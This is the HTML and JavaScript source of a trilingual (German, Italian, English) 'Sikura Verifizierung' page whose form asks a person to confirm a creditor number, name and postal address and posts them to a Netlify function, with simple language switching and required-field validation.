<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sikura Verifizierung</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 0; }
    .container { max-width: 600px; margin: 50px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    label { display: block; margin-top: 15px; }
    input, select, textarea, button { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; }
    button { background: #0066cc; color: white; font-size: 16px; cursor: pointer; }
    button:hover { background: #004999; }
    .error { color: red; font-size: 0.9em; }
  </style>
  <script>
    const translations = {
      de: {
        title: "Bitte bestätigen Sie Ihre Daten",
        glaeubiger: "Gläubiger-Nr.",
        vorname: "Vorname",
        name: "Name",
        strasse: "Strasse",
        hausnummer: "Hausnummer",
        plz: "Postleitzahl",
        ort: "Ort",
        land: "Land",
        submit: "Absenden",
        error_required: "Dieses Feld ist erforderlich."
      },
      it: {
        title: "Si prega di confermare i dati",
        glaeubiger: "Numero creditore",
        vorname: "Nome",
        name: "Cognome",
        strasse: "Via",
        hausnummer: "Numero civico",
        plz: "CAP",
        ort: "Località",
        land: "Paese",
        submit: "Inviare",
        error_required: "Questo campo è obbligatorio."
      },
      en: {
        title: "Please confirm your data",
        glaeubiger: "Creditor No.",
        vorname: "First Name",
        name: "Last Name",
        strasse: "Street",
        hausnummer: "House Number",
        plz: "ZIP Code",
        ort: "City",
        land: "Country",
        submit: "Submit",
        error_required: "This field is required."
      }
    };

    let currentLang = 'de';

    function setLanguage(lang) {
      currentLang = lang;
      const t = translations[lang];
      document.getElementById('form-title').innerText = t.title;
      for (let key of ['glaeubiger','vorname','name','strasse','hausnummer','plz','ort','land']) {
        document.querySelector(`label[for="${key}"]`).innerText = t[key];
      }
      document.querySelector('button[type="submit"]').innerText = t.submit;
    }

    function validateForm(event) {
      let valid = true;
      const t = translations[currentLang];
      document.querySelectorAll('.error').forEach(e => e.innerText = '');
      document.querySelectorAll('[required]').forEach(input => {
        if (!input.value.trim()) {
          valid = false;
          document.getElementById(input.name + '-error').innerText = t.error_required;
        }
      });
      if (!valid) event.preventDefault();
    }

    window.onload = () => {
      setLanguage(currentLang);
      document.getElementById('language').addEventListener('change', e => setLanguage(e.target.value));
      document.getElementById('verify-form').addEventListener('submit', validateForm);
    };
  </script>
</head>
<body>
  <div class="container">
    <h2 id="form-title">Bitte bestätigen Sie Ihre Daten</h2>
    <form id="verify-form" method="POST" action="/.netlify/functions/verify_submit">
      <label for="language">Sprache / Lingua / Language</label>
      <select id="language">
        <option value="de">Deutsch</option>
        <option value="it">Italiano</option>
        <option value="en">English</option>
      </select>

      <label for="glaeubiger">Gläubiger-Nr.</label>
      <input type="text" id="glaeubiger" name="glaeubiger" readonly />

      <label for="vorname">Vorname</label>
      <input type="text" id="vorname" name="vorname" required />
      <div class="error" id="vorname-error"></div>

      <label for="name">Name</label>
      <input type="text" id="name" name="name" required />
      <div class="error" id="name-error"></div>

      <label for="strasse">Strasse</label>
      <input type="text" id="strasse" name="strasse" required />
      <div class="error" id="strasse-error"></div>

      <label for="hausnummer">Hausnummer</label>
      <input type="text" id="hausnummer" name="hausnummer" required />
      <div class="error" id="hausnummer-error"></div>

      <label for="plz">Postleitzahl</label>
      <input type="text" id="plz" name="plz" required />
      <div class="error" id="plz-error"></div>

      <label for="ort">Ort</label>
      <input type="text" id="ort" name="ort" required />
      <div class="error" id="ort-error"></div>

      <label for="land">Land</label>
      <input type="text" id="land" name="land" required />
      <div class="error" id="land-error"></div>

      <input type="hidden" id="token" name="token" />
      <input type="hidden" id="id" name="id" />
      <input type="hidden" id="email" name="email" />

      <button type="submit">Absenden</button>
    </form>
  </div>
</body>
</html>
